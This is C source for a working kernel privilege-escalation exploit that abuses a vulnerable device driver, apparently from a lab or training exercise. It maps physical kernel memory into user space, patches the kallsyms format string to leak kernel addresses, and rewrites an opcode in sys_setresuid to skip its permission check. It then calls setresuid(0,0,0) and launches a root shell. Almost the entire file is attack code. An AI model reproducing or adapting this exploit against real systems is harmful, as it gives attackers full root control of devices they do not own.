#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#define VULKDEV_DEVICE "/dev/vulkdev3"

/*
based on mt2712 device:
# cat /proc/iomem
...
19001000-19001fff : /jpegdec@19001000
19002000-19002fff : /jpegdec@19001000
40000000-42ff5fff : System RAM
  40080000-40ffffff : Kernel code
  41200000-413fefff : Kernel data
43040000-43ebffff : System RAM
43f00000-44dfffff : System RAM
45000000-ffffffff : System RAM

*/
#define MMAP_START  0x42424000
#define MMAP_SIZE   0x03000000
#define MMAP_OFFSET 0x40000000

#define KERNEL_ADDR 0xffffff8008000000

unsigned long get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f)
		return 0;
  
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
  
	return 0;
}

int kernel_mmap1(int argc, char* argv[])
{
	int fd;
	uid_t uid;
	unsigned int *addr;
	unsigned long start;

	fd = open(VULKDEV_DEVICE, O_RDWR);
	if (fd < 0) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	addr = (unsigned int *)mmap((void *)MMAP_START, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, MMAP_OFFSET);
	if (addr == MAP_FAILED) {
		printf("mmap failed, errno = %d\n", errno);
		close(fd);
		return -1;
	}
	start = (unsigned long)addr;
	printf("mmap addr: %lx\n", start);
	uid = getuid();
	printf("uid = %d\n", uid);

	unsigned long sys_setresuid = 0;
	printf("search string \"%%pK %%c %%s\\n\" in memory...\n");
	while ((unsigned long)addr < start + MMAP_SIZE - 0x40) {
		char *str = (char *)addr;
		if (!strcmp(str, "%pK %c %s\n")) {
			printf("found string, addr = %p\n", str);
			printf("patch string...\n");
			str[2] = ' ';
			sys_setresuid = get_symbol("sys_setresuid");
			break;
		}
		addr++;
	}
	if (sys_setresuid) {
		// restore "%pK %c %s\n"
		char *str = (char *)addr;
		str[2] = 'K';
		printf("sys_setresuid = 0x%lx\n", sys_setresuid);
		unsigned int *p = (unsigned int *)(sys_setresuid - KERNEL_ADDR + start);
		unsigned int *end = p + 200;
		while (p < end) {
			if (*p == 0x540004a1) {
				printf("found target opcode, addr=%p\n", p);
				printf("patch opcode...\n");
				*p = 0x14000025;
				break;
			}
			p++;
		}
		sleep(2);
		if (*p == 0x14000025) {
			printf("patch opcode done, *p = %08x\n", *p);
			setresuid(0, 0, 0);
			*p = 0x540004a1;
		} else {
			printf("patch opcode failed\n");
		}
	}
	if (getuid() == 0) {
		printf("GOT ROOT!\n");
		execl("/bin/sh", "sh", NULL);
	}
	return 0;
}

